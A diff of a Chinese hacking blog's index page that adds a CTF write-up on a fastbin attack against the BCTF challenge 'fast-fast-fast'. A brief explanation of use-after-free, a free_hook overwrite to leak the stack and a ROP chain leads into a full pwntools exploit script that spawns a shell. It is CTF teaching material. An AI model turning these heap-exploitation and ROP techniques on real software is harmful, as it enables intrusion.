@@ -226,6 +226,72 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-fastbin-attack" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/04/06/fastbin-attack/" class="article-date">
+      <time datetime="2017-04-07T04:50:15.000Z" itemprop="datePublished">2017-04-06</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/04/06/fastbin-attack/">fastbin attack 利用</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>这也算是给自己补补堆溢出的姿势吧。</p>
+<p>题目是一题来自bctf二月场的fastbin attack 非常经典的一题教学题，当时由于知识点没有get到，所以没做出来，一直放桌面，最近闲太碍眼了，开始日。</p>
+<p>首先补一波fast bin attack的姿势，参考自freebuf:<a href="http://www.freebuf.com/news/88660.html" target="_blank" rel="external">http://www.freebuf.com/news/88660.html</a></p>
+<p>基本上看着这个就能做出题目了。</p>
+<p>这题题目涉及到了两个考点1、UAF姿势 2、fastbin attack 的姿势</p>
+<p>注意点是，malloc fastbin 会检测长度，如果长度不符合就会报错，就像下面这样。<br><img src="/2017/04/06/fastbin-attack/1.png" alt="1.png" title=""><br>所以需要使待malloc的fast chunk内的size符合要求。。（BTW chunk结构不多说了，自己去百度）这一般情况下需要自己去构造，不过这题例外，题目给出了利用点，即地址为0x6C4Aa0 ，所以说教学题。。很经典。。。</p>
+<p>接着我们就可以任意地址写啦~~,不过我们的目的是要拿到shell，这题是静态编译的，所以我们可以考虑下用ropchain来拿shell</p>
+<p>需要用rop的话，栈内的数据必须是我们可控的，目前手里有个任意地址写的漏洞，但是我们不知道栈的地址，所以我们接下去要做的就是拿到栈地址，需要有个函数来泄露栈地址。这边将free_hook修改成printf函数的地址，在调用free的时候会跳转到printf执行。泄露栈地址之后，将我们的rop写入栈，并执行。exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-06 07:15:19</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">	p = process(<span class="string">'./fast-fast-fast'</span>)</div><div class="line">	gdb.attach(p,<span class="string">"b*0x40141B\nc"</span>)</div><div class="line"><span class="comment"># else:</span></div><div class="line"><span class="comment"># 	p = remote()</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">	p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">	p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line">	<span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_fast</span><span class="params">(data)</span>:</span></div><div class="line">	ru(<span class="string">"saysecret\n"</span>)</div><div class="line">	sl(<span class="string">"1"</span>)</div><div class="line">	ru(<span class="string">"delet\n"</span>)</div><div class="line">	sl(<span class="string">'1'</span>)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sl(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_fast</span><span class="params">(data)</span>:</span></div><div class="line">	ru(<span class="string">"saysecret\n"</span>)</div><div class="line">	sl(<span class="string">"1"</span>)</div><div class="line">	ru(<span class="string">"delet\n"</span>)</div><div class="line">	sl(<span class="string">'2'</span>)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sl(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_fast</span><span class="params">()</span>:</span></div><div class="line">	ru(<span class="string">"saysecret\n"</span>)</div><div class="line">	sl(<span class="string">"1"</span>)</div><div class="line">	ru(<span class="string">"delet\n"</span>)</div><div class="line">	sl(<span class="string">'3'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_small</span><span class="params">(data)</span>:</span></div><div class="line">	ru(<span class="string">"saysecret\n"</span>)</div><div class="line">	sl(<span class="string">"2"</span>)</div><div class="line">	ru(<span class="string">"delet\n"</span>)</div><div class="line">	sl(<span class="string">'1'</span>)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sl(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_small</span><span class="params">(data)</span>:</span></div><div class="line">	ru(<span class="string">"saysecret\n"</span>)</div><div class="line">	sl(<span class="string">"2"</span>)</div><div class="line">	ru(<span class="string">"delet\n"</span>)</div><div class="line">	sl(<span class="string">'2'</span>)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sl(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_small</span><span class="params">()</span>:</span></div><div class="line">	ru(<span class="string">"saysecret\n"</span>)</div><div class="line">	sl(<span class="string">"2"</span>)</div><div class="line">	ru(<span class="string">"delet\n"</span>)</div><div class="line">	sl(<span class="string">'3'</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">say</span><span class="params">()</span>:</span></div><div class="line">	ru(<span class="string">"saysecret\n"</span>)</div><div class="line">	sl(<span class="string">"3"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(addr,data)</span>:</span></div><div class="line">	edit_fast(p64(<span class="number">1</span>)+p64(<span class="number">0xFB0</span>)+p64(addr))<span class="comment">#change small chunk</span></div><div class="line">	edit_small(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getchain</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">from</span> struct <span class="keyword">import</span> pack</div><div class="line">	p = <span class="string">''</span></div><div class="line"></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000401b97</span>) <span class="comment"># pop rsi ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006c1060</span>) <span class="comment"># @ .data</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000044d8e4</span>) <span class="comment"># pop rax ; ret</span></div><div class="line">	p += <span class="string">'/bin//sh'</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000004714a1</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000401b97</span>) <span class="comment"># pop rsi ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006c1068</span>) <span class="comment"># @ .data + 8</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000041c3cf</span>) <span class="comment"># xor rax, rax ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000004714a1</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000401a83</span>) <span class="comment"># pop rdi ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006c1060</span>) <span class="comment"># @ .data</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000401b97</span>) <span class="comment"># pop rsi ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006c1068</span>) <span class="comment"># @ .data + 8</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000437835</span>) <span class="comment"># pop rdx ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006c1068</span>) <span class="comment"># @ .data + 8</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000041c3cf</span>) <span class="comment"># xor rax, rax ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464120</span>) <span class="comment"># add rax, 1 ; ret</span></div><div class="line">	p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000464e75</span>) <span class="comment"># syscall ; ret</span></div><div class="line">	<span class="keyword">return</span> p</div><div class="line">create_fast(<span class="string">"aaa"</span>)</div><div class="line">del_fast()</div><div class="line">create_small(<span class="string">"aaa"</span>)</div><div class="line">del_fast()</div><div class="line">create_fast(<span class="string">"aaa"</span>)</div><div class="line">del_fast()</div><div class="line">edit_small(p64(<span class="number">0x6C4Aa0</span>))</div><div class="line">say()</div><div class="line">create_fast(p64(<span class="number">0x6C4A80</span>))</div><div class="line">edit(<span class="number">0x6C3750</span>,p64(<span class="number">0x4082A0</span>))</div><div class="line">edit(<span class="number">0x6C2710</span>,<span class="string">"%8$llX"</span>)</div><div class="line">del_small()</div><div class="line">stack_addr = int(ru(<span class="string">"\n"</span>)[:<span class="number">12</span>],<span class="number">16</span>)<span class="number">-0x18</span></div><div class="line"><span class="keyword">print</span> <span class="string">"stack_addr="</span>+hex(stack_addr)</div><div class="line">edit(stack_addr,getchain())</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/heap-overflow/">heap overflow</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-FILE结构体的溢出利用【FSP】" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -789,69 +855,6 @@
       
         <p class="article-more-link">
           <a  href="/2016/06/08/2015-问鼎杯线下PWN/#more">阅读全文 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-【pwn】诡异的movsx和cdqe" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2016/06/08/【pwn】诡异的movsx和cdqe/" class="article-date">
-      <time datetime="2016-06-08T22:39:17.000Z" itemprop="datePublished">2016-06-08</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/06/08/【pwn】诡异的movsx和cdqe/">【pwn】诡异的movsx和cdqe</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>这是在做hack.lu 2014 的pwn的一题时发现的，也算补一波自己的汇编姿势了。<br><img src="/2016/06/08/【pwn】诡异的movsx和cdqe/1.png" alt="1.png" title=""><br>
-          
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/bin/">bin</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
-    </div>
-
-      
-        <p class="article-more-link">
-          <a  href="/2016/06/08/【pwn】诡异的movsx和cdqe/#more">阅读全文 >></a>
         </p>
       
       <div class="clearfix"></div>
